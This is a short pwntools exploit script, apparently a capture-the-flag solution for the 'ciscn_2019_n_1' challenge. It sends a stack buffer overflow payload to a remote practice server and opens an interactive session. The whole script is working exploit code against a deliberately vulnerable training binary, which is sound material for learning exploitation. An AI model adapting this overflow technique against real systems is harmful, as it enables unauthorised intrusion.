from pwn import *
#io = process("./ciscn_2019_n_1")
io = remote("node3.buuoj.cn", 26204)
payload = b'a'*(0x30-4) + p64(0x41348000)
io.send(payload)
io.interactive()